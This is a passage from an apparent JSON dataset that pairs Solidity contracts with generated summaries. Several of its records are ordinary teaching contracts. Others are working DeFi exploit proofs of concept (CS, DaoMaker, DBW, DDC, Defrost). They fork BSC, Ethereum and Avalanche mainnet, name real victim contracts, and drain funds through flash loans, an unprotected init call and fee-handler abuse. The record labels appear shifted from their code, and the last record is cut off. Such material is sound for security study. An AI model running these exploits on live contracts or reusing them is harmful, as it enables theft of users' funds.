testFailDoubleDeployDifferentBytecode(\n        bytes32 salt,\n        bytes calldata bytecode1,\n        bytes calldata bytecode2\n    ) public {\n        CREATE3.deploy(salt, bytecode1, 0);\n        CREATE3.deploy(salt, bytecode2, 0);\n    }\n}\n",
        "summary": "This code defines a smart contract named CREATE3Test, which tests the functionality of the CREATE3 library in Solidity. More specifically, it tests the deployment of ERC20 tokens using CREATE3.deploy(). There are four test functions defined: \n\n1. testDeployERC20(): tests the deployment of an ERC20 token using the CREATE3 library with a given salt value. It checks that the deployed token has the expected name, symbol, and decimals. \n\n2. testFailDoubleDeploySameBytecode(): checks that trying to deploy two contracts with the same salt and bytecode will result in failure.\n\n3. testFailDoubleDeployDifferentBytecode(): checks that trying to deploy two contracts with the same salt but different bytecode will result in failure.\n\n4. testDeployERC20(bytes32 salt, string calldata name, string calldata symbol, uint8 decimals): This function takes parameters to deploy a specific ERC20 token. \n\nThe code uses imports from other Solidity files that define contract dependencies like the WETH token, the MockERC20 token, and the MockAuthChild contract.",
        "id": "b7aff887-cf8e-4500-a5d3-12ce178d50db",
        "api_seq": "Crowdsale"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\nimport \"./ERC223ReceivingContract.sol\";\nimport \"./SafeMath.sol\";\nimport \"./ERC20.sol\";\nimport \"./Token.sol\";\n\ncontract Crowdsale is ERC223ReceivingContract {\n\n  using SafeMath for uint;\n\n  Token private _token;\n\n  uint private _start;\n  uint private _end;\n\n  uint private _price;\n  uint private _limit;\n  uint private _available;\n\n  mapping (address => uint) private _limits;\n\n  event Buy(address beneficiary, uint amount);\n\n  modifier available() {\n    require(_available > 0);\n    require(block.number >= _start && block.number < _end);\n    _;\n  }\n\n  modifier isToken() {\n    require(msg.sender == address(_token));\n    _;\n  }\n\n  modifier valid(address to, uint amount) {\n    assert(amount > 0);\n    amount = amount.div(_price);\n    assert(_limit >= amount);\n    assert(_limit >= _limits[to].add(amount));\n    _;\n  }\n\n  function Crowdsale(address token, uint start, uint end, uint price, uint limit)\n      public {\n      _token = Token(token);\n      _start = start;\n      _end = end;\n      _price = price;\n      _limit = limit;\n  }\n\n  function ()\n      public\n      payable {\n      // Not enough gas for the transaction so prevent users from sending ether\n      revert();\n  }\n\n  function buy()\n      public\n      payable {\n      return buyFor(msg.sender);\n  }\n\n  function buyFor(address beneficiary)\n      public\n      available\n      valid(beneficiary, msg.value)\n      payable {\n      uint amount = msg.value.div(_price);\n      _token.transfer(beneficiary, amount);\n      _available = _available.sub(amount);\n      _limits[beneficiary] = _limits[beneficiary].add(amount);\n      Buy(beneficiary, amount);\n  }\n\n  function tokenFallback(address, uint _value, bytes)\n      isToken\n      public {\n      _available = _available.add(_value);\n  }\n\n  function availableBalance()\n    view\n    public\n    returns (uint) {\n    return _available;\n  }\n}\n",
        "summary": "This is a smart contract for a token crowdsale. It imports four other Solidity files to use their functions. It defines a crowdsale contract that is inherited from the ERC223ReceivingContract contract and has several private variables, including the Token contract address, the start and end times for the crowdsale, the price of the token, a limit on how much one user can buy, and the total number of tokens available to buy. \n\nThe buy and buyFor functions enable individuals to purchase tokens using Ethereum that are then transferred to their accounts while keeping track of how much the individual spent and how many tokens the individual owns after the transaction. The availableBalance function returns the number of tokens left in the sale. \n\nThe contract also has various modifiers, including available to ensure the sale is still open and valid that ensures the individual is sending enough ether to purchase at least one token. Finally, the contract includes an event called Buy to allow users to listen for token purchases.",
        "id": "3b5a513a-3a10-446f-9be6-d3a4bb2663a7",
        "api_seq": "CS_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BlockSecTeam/status/1661098394130198528\n// https://twitter.com/numencyber/status/1661207123102167041\n// @TX\n// https://explorer.phalcon.xyz/tx/bsc/0x906394b2ee093720955a7d55bff1666f6cf6239e46bea8af99d6352b9687baa4\n// @Summary\n// Outdated global variable `sellAmount` for calculating `burnAmount`\n\n\n\n\ncontract CSExp is Test, IPancakeCallee {\n    IPancakePair pair = IPancakePair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);\n    IPancakeRouter router = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    IERC20 BUSD = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 CS = IERC20(0x8BC6Ce23E5e2c4f0A96429E3C9d482d74171215e);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 28466976);\n        \n    }\n\n    function testExp() external {\n        emit log_named_decimal_uint(\"[Start] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n        pair.swap(\n            80_000_000 ether,\n            0,\n            address(this),\n            bytes(\"123\")\n        );\n        emit log_named_decimal_uint(\"[End] Attacker BUSD Balance\", BUSD.balanceOf(address(this)), 18);\n    }\n\n    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external{\n        require(msg.sender == address(pair));\n        BUSD.approve(address(router), BUSD.balanceOf(address(this)));\n        address[] memory path = new address[](2);\n        path[0] = address(BUSD);\n        path[1] = address(CS);\n        for (uint i = 0; i < 99; ++i) {\n            router.swapTokensForExactTokens(\n                5000 ether,\n                BUSD.balanceOf(address(this)),\n                path,\n                address(this),\n                block.timestamp + 1000\n            );\n        }\n        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            BUSD.balanceOf(address(this)),\n            1,\n            path,\n            0x382e9652AC6854B56FD41DaBcFd7A9E633f1Edd5,\n            block.timestamp + 1000\n        );\n        CS.approve(address(router), CS.balanceOf(address(this)));\n        path[0] = address(CS);\n        path[1] = address(BUSD);\n        while (CS.balanceOf(address(this)) >= 3000 ether) {\n            router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n                3000 ether,\n                1,\n                path,\n                address(this),\n                block.timestamp + 1000\n            );\n            CS.transfer(address(this), 2);\n        }\n        BUSD.transfer(msg.sender, 80_240_000 ether);\n    }\n\n    receive() external payable {}\n    \n}\n\n\n",
        "summary": "This is a Solidity smart contract that tests a vulnerability in a PancakeSwap trading pair. The contract includes several imported interfaces and sets them to specific addresses. The main function is \"testExp\", which initiates a swap of a large amount of BUSD for a token called CS through the PancakeSwap trading pair. The function also includes a loop that repeatedly trades CS for BUSD to exploit a vulnerability in the calculation of the burn amount. The ultimate goal is to transfer a large amount of BUSD to the sender's address. The contract also includes a function called \"pancakeCall\", which implements the swapping logic for the PancakeSwap trading pair.",
        "id": "63d6927b-89aa-4dfc-8f2a-cd876ee16cdd",
        "api_seq": "DaoMaker_exp"
    },
    {
        "code": "// SPDX-License-Identifier: GPL-3.0\n\npragma solidity ^0.8.13;\n\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n/*\n    Attacker: 0x2708cace7b42302af26f1ab896111d87faeff92f\n    Attack tx: https://etherscan.io/tx/0x96bf6bd14a81cf19939c0b966389daed778c3a9528a6c5dd7a4d980dec966388\n    Affected contracts:\n        0x6e70c88be1d5c2a4c0c8205764d01abe6a3d2e22 - emergencyExit with 13.5M CAPS\n        0xd6c8dd834abeeefa7a663c1265ce840ca457b1ec - emergencyExit with 2.5M CPD, twice\n        0xdd571023d95ff6ce5716bf112ccb752e86212167 - emergencyExit with 1.44M DERC\n        0xa43b89d5e7951d410585360f6808133e8b919289 - emergencyExit with approx 20.6M SHO\n    Root cause: They left the `init` function unprotected. The attacker re-initialized the contract with \n    malicious data and then called `emergencyExit` to get away with the funds.\n*/\n\ninterface DAOMaker {\n    function init(uint256 , uint256[] calldata, uint256[] calldata, address ) external;\n    function emergencyExit(address) external;\n}\n\ncontract ContractTest is Test {\n\n    DAOMaker daomaker =  DAOMaker(0x2FD602Ed1F8cb6DEaBA9BEDd560ffE772eb85940);\n    IERC20 DERC = IERC20(0x9fa69536d1cda4A04cFB50688294de75B505a9aE);\n\n    function setUp() public {\n        vm.createSelectFork(\"mainnet\", 13155320); // fork mainnet block number 13155320\n    }\n\n   function testExploit() public { \n\n    uint256[] memory releasePeriods = new uint256[](1);\n    releasePeriods[0]= 5702400;\n    uint256[] memory releasePercents = new uint256[](1);\n    releasePercents[0]= 10000;\n\n    emit log_named_decimal_uint(\"Before exploiting, Attacker DERC balance\",DERC.balanceOf(address(this)), 18);\n\n    // initialize to become contract owner\n    daomaker.init(1640984401,releasePeriods,releasePercents,0x9fa69536d1cda4A04cFB50688294de75B505a9aE);\n\n    // call emergencyExit to drain out the token.\n    daomaker.emergencyExit(address(this));\n\n    emit log_named_decimal_uint(\"After exploiting, Attacker DERC balance\",DERC.balanceOf(address(this)), 18);\n   }\n\n   receive() external payable {}\n}",
        "summary": "This code is a Solidity smart contract that is part of an attack on several other contracts. The code initializes a contract owned by the attacker and then calls the 'emergencyExit' function to drain funds from several other contracts that had an unprotected 'init' function. The code also logs the attacker's DERC token balance before and after the exploit.",
        "id": "28b3781a-7262-414e-b1cc-99b5ad8ce913",
        "api_seq": "DataStorage"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.4;\n\ncontract DataStorage {\n    // The data location of x is storage.\n    // This is the only place where the\n    // data location can be omitted.\n    uint[] public x = [1,2,3];\n\n    function fStorage() public{\n        //\u58f0\u660e\u4e00\u4e2astorage\u7684\u53d8\u91cfxStorage\uff0c\u6307\u5411x\u3002\u4fee\u6539xStorage\u4e5f\u4f1a\u5f71\u54cdx\n        uint[] storage xStorage = x;\n        xStorage[0] = 100;\n    }\n\n    function fMemory() public view{\n        //\u58f0\u660e\u4e00\u4e2aMemory\u7684\u53d8\u91cfxMemory\uff0c\u590d\u5236x\u3002\u4fee\u6539xMemory\u4e0d\u4f1a\u5f71\u54cdx\n        uint[] memory xMemory = x;\n        xMemory[0] = 100;\n        xMemory[1] = 200;\n        uint[] memory xMemory2 = x;\n        xMemory2[0] = 300;\n    }\n\n    function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata){\n        //\u53c2\u6570\u4e3acalldata\u6570\u7ec4\uff0c\u4e0d\u80fd\u88ab\u4fee\u6539\n        // _x[0] = 0 //\u8fd9\u6837\u4fee\u6539\u4f1a\u62a5\u9519\n        return(_x);\n    }\n}\n\ncontract Variables {\n    uint public x = 1;\n    uint public y;\n    string public z;\n\n    function foo() external{\n        // \u53ef\u4ee5\u5728\u51fd\u6570\u91cc\u66f4\u6539\u72b6\u6001\u53d8\u91cf\u7684\u503c\n        x = 5;\n        y = 2;\n        z = \"0xAA\";\n    }\n\n    function bar() external pure returns(uint){\n        uint xx = 1;\n        uint yy = 3;\n        uint zz = xx + yy;\n        return(zz);\n    }\n\n    function global() external view returns(address, uint, bytes memory){\n        address sender = msg.sender;\n        uint blockNum = block.number;\n        bytes memory data = msg.data;\n        return(sender, blockNum, data);\n    }\n\n    function weiUnit() external pure returns(uint) {\n        assert(1 wei == 1e0);\n        assert(1 wei == 1);\n        return 1 wei;\n    }\n\n    function gweiUnit() external pure returns(uint) {\n        assert(1 gwei == 1e9);\n        assert(1 gwei == 1000000000);\n        return 1 gwei;\n    }\n\n    function etherUnit() external pure returns(uint) {\n        assert(1 ether == 1e18);\n        assert(1 ether == 1000000000000000000);\n        return 1 ether;\n    }\n    \n    function secondsUnit() external pure returns(uint) {\n        assert(1 seconds == 1);\n        return 1 seconds;\n    }\n\n    function minutesUnit() external pure returns(uint) {\n        assert(1 minutes == 60);\n        assert(1 minutes == 60 seconds);\n        return 1 minutes;\n    }\n\n    function hoursUnit() external pure returns(uint) {\n        assert(1 hours == 3600);\n        assert(1 hours == 60 minutes);\n        return 1 hours;\n    }\n\n    function daysUnit() external pure returns(uint) {\n        assert(1 days == 86400);\n        assert(1 days == 24 hours);\n        return 1 days;\n    }\n\n    function weeksUnit() external pure returns(uint) {\n        assert(1 weeks == 604800);\n        assert(1 weeks == 7 days);\n        return 1 weeks;\n    }\n}\n\n\n\n",
        "summary": "This Solidity code defines two contracts. The first contract, `DataStorage`, includes three functions that demonstrate the use of different types of variables in Solidity - storage, memory, and calldata - and how they behave in relation to each other. The second contract, `Variables`, includes functions that demonstrate the use of different global variables and units in Solidity - such as `msg.sender`, `block.number`, and time units like `seconds`, `minutes`, and `hours`. The code includes comments explaining each line of code.",
        "id": "e198aaf3-f285-4416-96a2-f0236d3188c5",
        "api_seq": "DataTypes"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract DataTypes {\n    \n    bool myBool = false;\n    \n    int8 myInt = -128;\n    uint8 myUInt = 255;\n    \n    string myString;\n    uint8[] myStringArr;\n\n    byte myValue;\n    bytes1 myBytes1; \n    bytes32 myBytes32;\n    \n//    fixed256x8 myFixed = 1; // 255.0\n//    ufixed myFixed = 1;\n\n    enum Action {ADD, REMOVE, UPDATE}\n    \n    Action myAction = Action.ADD;\n    \n    address myAddress;\n    \n    function assignAddress() public {\n        myAddress = msg.sender;\n        myAddress.balance;\n        myAddress.transfer(10);\n    }\n    \n    uint[] myIntArr = [1,2,3];\n    \n    function arrFunc() public {\n        myIntArr.push(1);\n        myIntArr.length;\n        myIntArr[0];\n    }\n    \n    uint[10] myFixedArr;\n    \n    struct Account {\n        uint balance;\n        uint dailyLimit;\n    }\n    \n    Account myAccount;\n    \n    function structFunc() public {\n        myAccount.balance = 100;\n    }\n    \n    mapping (address => Account) _accounts;\n    \n    function () public payable {\n        _accounts[msg.sender].balance += msg.value;\n    }\n    \n    function getBalance() public view returns (uint) {\n        return _accounts[msg.sender].balance;\n    }\n}\n",
        "summary": "This is a smart contract written in Solidity programming language which demonstrates the usage of different types of data such as boolean, integers with different sizes, strings, byte arrays, enums, addresses, arrays, structs, and mappings. It also includes example functions related to proper usage of these data types, like assigning addresses, working with arrays, retrieving balances, and storing account balances for a mapping variable.",
        "id": "94466606-ddce-40af-8e91-4a2c88aa8ac0",
        "api_seq": "DateSuffixes"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  function MyContract() {\n    assert(1 == 1 seconds);\n    assert(1 minutes == 60 seconds);\n    assert(1 hours == 60 minutes);\n    assert(1 days == 24 hours);\n    assert(1 weeks == 7 days);\n    assert(1 years == 365 days);\n  }\n\n  function hasStarted(uint start, uint daysAfter) returns (bool) {\n    return (now >= start + daysAfter * 1 days);\n  }\n}\n",
        "summary": "This is a Solidity smart contract with a constructor function that makes several assertions to test that time units are being represented correctly. It also has a `hasStarted` function that takes two parameters (`start` and `daysAfter`) and returns a boolean value based on whether the current time is equal to or greater than the specified start time plus the specified number of days.",
        "id": "9c61544d-79d5-4ed4-b7e1-99c1afecda86",
        "api_seq": "DBW_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1639655134232969216\n// https://twitter.com/AnciliaInc/status/1639289686937210880\n// @TX\n// https://bscscan.com/tx/0x3b472f87431a52082bae7d8524b4e0af3cf930a105646259e1249f2218525607\n// @Summary\n// The root cause is that the dividend awards are based on the percentage of LP currently owned by the user,\n// and does not take into account multiple dividends after the transfer of LP.\n// @Similar events\n// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20230103---gds---business-logic-flaw\n// https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation\n\ninterface IDBW is IERC20 {\n    function pledge_lp(uint256 count) external;\n    function getStaticIncome() external;\n    function redemption_lp(uint256 count) external;\n}\n\ncontract ContractTest is Test {\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);\n    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);\n    address dodo1 = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n    address dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;\n    address dodo3 = 0x26d0c625e5F5D6de034495fbDe1F6e9377185618;\n    address dodo4 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;\n    Uni_Pair_V2 flashSwapPair = Uni_Pair_V2(0x618f9Eb0E1a698409621f4F487B563529f003643);\n    uint256 dodo1FlashLoanAmount;\n    uint256 dodo2FlashLoanAmount;\n    uint256 dodo3FlashLoanAmount;\n    uint256 dodo4FlashLoanAmount;\n    uint256 PairFlashLoanAmount;\n    claimRewardImpl RewardImpl;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 26_745_691);\n        cheats.label(address(USDT), \"USDT\");\n        cheats.label(address(DBW), \"DBW\");\n        cheats.label(address(Pair), \"Pair\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(dodo1), \"dodo1\");\n        cheats.label(address(dodo2), \"dodo2\");\n        cheats.label(address(dodo3), \"dodo3\");\n        cheats.label(address(dodo4), \"dodo4\");\n        cheats.label(address(flashSwapPair), \"flashSwapPair\");\n    }\n\n    function testExploit() external {\n        RewardImpl = new claimRewardImpl();\n        dodo1FlashLoanAmount = USDT.balanceOf(dodo1);\n        DVM(dodo1).flashLoan(0, dodo1FlashLoanAmount, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"Attacker USDT balance after exploit\", USDT.balanceOf(address(this)), USDT.decimals()\n            );\n    }\n\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        if (msg.sender == dodo1) {\n            dodo2FlashLoanAmount = USDT.balanceOf(dodo2);\n            DVM(dodo2).flashLoan(0, dodo2FlashLoanAmount, address(this), new bytes(1));\n            USDT.transfer(dodo1, dodo1FlashLoanAmount);\n        } else if (msg.sender == dodo2) {\n            dodo3FlashLoanAmount = USDT.balanceOf(dodo3);\n            DVM(dodo3).flashLoan(0, dodo3FlashLoanAmount, address(this), new bytes(1));\n            USDT.transfer(dodo2, dodo2FlashLoanAmount);\n        } else if (msg.sender == dodo3) {\n            dodo4FlashLoanAmount = USDT.balanceOf(dodo4);\n            DVM(dodo4).flashLoan(0, dodo4FlashLoanAmount, address(this), new bytes(1));\n            USDT.transfer(dodo3, dodo3FlashLoanAmount);\n        } else if (msg.sender == dodo4) {\n            PairFlashLoanAmount = 3_037_214_233_168_643_025_678_873;\n            flashSwapPair.swap(PairFlashLoanAmount, 0, address(this), new bytes(1));\n            USDT.transfer(dodo4, dodo4FlashLoanAmount);\n        }\n    }\n\n    function hook(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {\n        USDT.approve(address(Router), type(uint256).max);\n        DBW.approve(address(Router), type(uint256).max);\n        Pair.approve(address(Router), type(uint256).max);\n        USDTToDBW_AddLiquidity();\n        miniProxyCloneFactory(address(RewardImpl));\n        RemoveLiquidity_DBWToUSDT();\n        USDT.transfer(address(flashSwapPair), PairFlashLoanAmount * 10_000 / 9999 + 1000);\n    }\n\n    function USDTToDBW_AddLiquidity() internal {\n        address[] memory path = new address[](2);\n        path[0] = address(USDT);\n        path[1] = address(DBW);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            800_000 * 1e18, 0, path, address(this), block.timestamp\n        );\n        Router.addLiquidity(\n            address(USDT),\n            address(DBW),\n            USDT.balanceOf(address(this)),\n            DBW.balanceOf(address(this)),\n            0,\n            0,\n            address(this),\n            block.timestamp\n        );\n    }\n\n    function miniProxyCloneFactory(address impl) internal {\n        for (uint256 i; i < 18; ++i) {\n            uint256 _salt = uint256(keccak256(abi.encodePacked(i)));\n            bytes memory creationBytecode = getCreationBytecode(address(impl));\n            address newImpl = getAddress(creationBytecode, _salt);\n            Pair.transfer(newImpl, Pair.balanceOf(address(this)));\n            // new miniProxy{salt: keccak256(\"salt\")}(impl);\n            deploy(creationBytecode, _salt);\n            (uint256 USDTReserve, uint256 DBWReserve,) = Pair.getReserves();\n            uint256 DBWInPairAmount = DBW.balanceOf(address(Pair));\n            uint256 USDTTransferAmount = DBWInPairAmount * USDTReserve / DBWReserve - USDTReserve;\n            USDT.transfer(address(Pair), USDTTransferAmount);\n            Pair.mint(address(this));\n        }\n    }\n\n    function RemoveLiquidity_DBWToUSDT() internal {\n        Router.removeLiquidity(\n            address(USDT), address(DBW), Pair.balanceOf(address(this)), 0, 0, address(this), block.timestamp\n        );\n        address[] memory path = new address[](2);\n        path[0] = address(DBW);\n        path[1] = address(USDT);\n        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(\n            DBW.balanceOf(address(this)), 0, path, address(this), block.timestamp\n        );\n    }\n\n    function getCreationBytecode(address claimImpl) public pure returns (bytes memory) {\n        bytes memory bytecode = type(miniProxy).creationCode;\n        return abi.encodePacked(bytecode, abi.encode(claimImpl));\n    }\n\n    function getAddress(bytes memory bytecode, uint256 _salt) public view returns (address) {\n        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), _salt, keccak256(bytecode)));\n        return address(uint160(uint256(hash)));\n    }\n\n    function deploy(bytes memory bytecode, uint256 _salt) internal {\n        address addr;\n        assembly {\n            addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)\n        }\n    }\n}\n\ncontract claimRewardImpl is Test {\n    function exploit() public {\n        IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);\n        Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);\n        Pair.approve(address(DBW), type(uint256).max);\n        DBW.getStaticIncome();\n        vm.warp(block.timestamp + 2 * 24 * 60 * 60); // bypass locktime Limit\n        uint256 LPAmount = Pair.balanceOf(address(this));\n        DBW.pledge_lp(LPAmount); // send LP\n        DBW.getStaticIncome(); // claim reward\n        DBW.redemption_lp(LPAmount); // redeem LP\n        Pair.transfer(msg.sender, LPAmount);\n        DBW.transfer(address(Pair), DBW.balanceOf(address(this)));\n    }\n}\n\ncontract miniProxy {\n    constructor(address claimRewardImpl) {\n        (bool success,) = claimRewardImpl.delegatecall(abi.encodeWithSignature(\"exploit()\"));\n        require(success);\n        selfdestruct(payable(tx.origin));\n    }\n}\n",
        "summary": "This is a Solidity smart contract that describes an exploit in the contract of another project called DBW. It imports various other contracts, interfaces, and libraries required to execute the exploit. The contract includes a test function called testExploit() that executes the exploit. The exploit involves using flash loans to manipulate the DBW contract and withdraw a large amount of funds in a single transaction. Additionally, the contract includes a helper contract called claimRewardImpl, which implements the exploit strategy.",
        "id": "e29295f4-a28c-4b1e-b317-3a8e73694f69",
        "api_seq": "DDC_exp"
    },
    {
        "code": "pragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n//import \"./interface.sol\";\ninterface CheatCodes {\n     function createSelectFork(string calldata,uint256) external returns(uint256);\n}\ninterface IERC20 {\n    function balanceOf(address owner) external view returns (uint256);\n    function approve(address spender, uint256 value) external returns (bool);\n    function transfer(address to, uint256 value) external returns (bool);\n}\n\ninterface ITokenAFeeHandler is IERC20{\n    function handleDeductFee(uint8 actionType,uint256 feeAmount,address from,address user) external;\n}\n\ninterface IRouter{\n    function swapExactTokensForTokens(\n        uint amountIn, \n        uint amountOutMin, \n        address[] calldata path, \n        address to, \n        uint deadline\n        ) external;\n        function swapExactTokensForTokensSupportingFeeOnTransferTokens(\n        uint amountIn,\n        uint amountOutMin,\n        address[] calldata path,\n        address to,\n        uint deadline\n    ) external;\n}\n\ninterface IPair{\n    function sync() external;\n}\n\ncontract ContractTest is DSTest {\n\n    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IRouter TargetRouter =IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);\n    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    ITokenAFeeHandler DDC = ITokenAFeeHandler(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1);\n    IPair TargetPair = IPair(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0);\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 20840079);\n    }\n\n    function testExploit() external {\n\n        emit log_named_decimal_uint(\n            \"[Start] Attacker USDT balance before exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n        address(WBNB).call{value: 0.1 ether}(\"\");\n        BuyDDC();\n        uint256 pairReserve = DDC.balanceOf(address(TargetPair));\n        uint256 amount = pairReserve - 1;\n        DDC.handleDeductFee(0, amount, address(TargetPair), address(this));\n        TargetPair.sync();\n        SellDDC();\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDT balance after exploit\",\n            USDT.balanceOf(address(this)),\n            18\n        );\n\n    }\n\n    function BuyDDC() public{\n        WBNB.approve(address(TargetRouter), ~uint256(0));\n        address[] memory path = new address[](3);\n        path[0] = address(WBNB);\n        path[1] = address(USDT);\n        path[2] = address(DDC);\n        TargetRouter.swapExactTokensForTokens(\n            WBNB.balanceOf(address(this)), \n            0, \n            path, \n            address(this), \n            block.timestamp\n            );\n        DDC.approve(address(TargetRouter), ~uint256(0));\n    }\n\n    function SellDDC() public{\n        address[] memory path = new address[](2);\n        path[0] = address(DDC);\n        path[1] = address(USDT);\n        TargetRouter.swapExactTokensForTokens(\n            DDC.balanceOf(address(this)), \n            0, \n            path, \n            address(this), \n            block.timestamp\n            );\n    }\n\n\n}",
        "summary": "This is a Solidity smart contract that tests an exploit on a decentralized exchange (DEX), specifically on the Binance Smart Chain (BSC). The contract imports several interfaces including IERC20, ITokenAFeeHandler, IRouter, IPair, and CheatCodes. The functions in this contract perform the following actions: \n1. Sets up the contract with the relevant addresses required to interact with the DEX\n2. Executes the `testExploit()` function, which performs an exploit by manipulating the pair reserve of DDC. This is done by buying DDC with WBNB, manipulating the DDC pair reserve, and then selling DDC for USDT. \n3. The result of the exploit is logged, specifically the balance of USDT before and after the exploit. \n\nIt is important to note that this code is only meant for testing purposes, and it is not intended for use in a production environment.",
        "id": "fa11ad71-d9d9-4118-adb1-c6f0eabbd83c",
        "api_seq": "Debugging"
    },
    {
        "code": "pragma solidity ^0.4.0;\n\ncontract Debugging {\n    \n    uint[] private vars;\n    \n    function assignment() public pure {\n        uint myVal1 = 1;\n        uint myVal2 = 2;\n        assert(myVal1 == myVal2);\n    }\n    \n    function memoryAlloc() public pure {\n        string memory myString = \"test\";\n        assert(bytes(myString).length == 10);\n    }\n    \n    function storageAlloc() public {\n        vars.push(2);\n        vars.push(3);\n        assert(vars.length == 4);\n    }\n    \n}\n",
        "summary": "This Solidity smart contract defines three functions with different types of debugging activities. \n\nThe `assignment()` function assigns values to two variables and then uses an `assert()` statement to check if they are equal. This is a common debugging technique to catch errors early by verifying that the expected condition is true.\n\nThe `memoryAlloc()` function creates a string variable in memory and then uses an `assert()` statement to check if the length of the string byte array is equal to 10. This demonstrates how to allocate and check memory in Solidity.\n\nThe `storageAlloc()` function adds two elements to an array stored in the contract's storage. It then uses an `assert()` statement to check if the length of the array is equal to 4. This shows how to manage data stored in the contract's state variables and how to verify changes made to them.",
        "id": "b8499420-6139-4c29-93a0-5261de89c509",
        "api_seq": "DefaultDataTypes"
    },
    {
        "code": "pragma solidity ^0.4.4;\n\ncontract MyContract {\n  int n; // 0\n  string str; // \"\"\n  address addr; // 0x0000000000000000000000000000000000000000\n  bool b; // false\n\n  function MyContract() {\n    assert(n == 0);\n    assert(sha3(str) == \"\");\n    assert(addr == address(0));\n    assert(b == false);\n  }\n}\n",
        "summary": "This code is a Smart Contract written in Solidity that initializes four variables with initial values of 0, \"\", 0x0000000000000000000000000000000000000000, and false respectively. The constructor function then performs a series of assertions to ensure that each of these variables has the expected initial value.",
        "id": "77afc26c-e27d-40b1-969c-7c64f49187a8",
        "api_seq": "Defrost_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n// @Analysis\n// https://twitter.com/PeckShieldAlert/status/1606276020276891650\n// @TX\n// https://snowtrace.io/tx/0xc6fb8217e45870a93c25e2098f54f6e3b24674a3083c30664867de474bf0212d\n\ninterface LSWUSDC{\n    function maxFlashLoan(address token) external view returns(uint256);\n    function flashFee(address token, uint256 amount) external view returns(uint256);\n    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;\n    function deposit(uint256 amount, address to) external returns(uint256);\n    function redeem(uint256 shares, address receiver, address owner) external;\n}\n\ncontract ContractTest is DSTest{\n    IERC20 USDC = IERC20(0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E);\n    LSWUSDC LSW = LSWUSDC(0xfF152e21C5A511c478ED23D1b89Bb9391bE6de96);\n    Uni_Pair_V2 Pair = Uni_Pair_V2(0xf4003F4efBE8691B60249E6afbD307aBE7758adb);\n    uint flashLoanAmount;\n    uint flashLoanFee; \n    uint depositAmount;\n\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    function setUp() public {\n        cheats.createSelectFork(\"Avalanche\", 24003940);\n    }\n\n    function testExploit() public{\n        flashLoanAmount = LSW.maxFlashLoan(address(USDC));\n        flashLoanFee = LSW.flashFee(address(USDC), flashLoanAmount);\n        Pair.swap(0, flashLoanAmount + flashLoanFee, address(this), new bytes(1));\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\",\n            